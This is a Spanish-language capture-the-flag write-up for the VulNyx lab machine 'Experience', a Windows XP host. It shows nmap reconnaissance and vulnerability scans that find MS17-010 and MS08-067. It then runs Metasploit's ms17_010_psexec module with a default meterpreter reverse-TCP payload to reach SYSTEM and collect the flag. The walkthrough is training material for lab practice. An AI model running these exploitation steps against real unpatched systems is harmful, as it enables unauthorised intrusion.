---
tags:
  - estado/completo
plataforma: "[[VulNyx]]"
dificultad: Fácil
os: Linux
relacionados:
  - "[[msfconsole]]"
---
#  VulNix - Experience

## Reconocimiento

### Escaneo de puertos

```bash
❯ nmap -p- -T5 -n -v 192.168.1.12
```

```
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```


### Escaneo de servicios

```bash
❯ nmap -sVC -p135,139,445 -v 192.168.1.12
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: EXPERIENCE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:0d:40:07 (Oracle VirtualBox virtual NIC)
| Names:
|   EXPERIENCE<00>       Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   EXPERIENCE<20>       Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: experience
|   NetBIOS computer name: EXPERIENCE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-01-21T15:23:23-08:00
|_clock-skew: mean: 12h59m59s, deviation: 5h39m24s, median: 8h59m59s
```

### Escaneo de vulnerabilidades.

```bash
nmap --script vuln -p445 192.168.1.12
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 15:49 CET
Nmap scan report for 192.168.1.12
Host is up (0.0012s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.         
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-425
```

___

## Explotación de vulnerabilidades

El escaneo me ha detectado varias vulnerabilidades, yo usaré la **ms17-010_psexec**, también sirve la **ms08-067**. Abro **Metasploit** y hago una búsqueda por **ms17-010**.

```txt
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

___



Con **use 1** selecciono directamente el **ms17_010_psexec**.

```txt
msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > 
```

```
options
```

Configuro el exploit y lo lanzo con `run`.

```txt
msf6 exploit(windows/smb/ms17_010_psexec) > setg rhosts 192.168.1.12
rhosts => 192.168.1.12
```

![run](https://0x-noname.github.io/machines/nyx/experience/run.webp)

Lanzo **sysinfo** para ver información del sistema.

![systeminfo](https://0x-noname.github.io/machines/nyx/experience/systeminfo.webp)

Con **getsystem** me doy cuenta de que ya soy **SYSTEM**.

![getsystem](https://0x-noname.github.io/machines/nyx/experience/getsystem.webp)

Lanzo el comando **shell** y obtengo una consola de **ms-dos**.

![shell](https://0x-noname.github.io/machines/nyx/experience/shell.webp)

En el escritorio de **bill** obtengo las flags.

![rutaBill](https://0x-noname.github.io/machines/nyx/experience/rutaBill.webp)

Y aquí termina la máquina Experience.

## Bandera(s)

> [!flag] `flag{B4nd3r4}`
^bandera
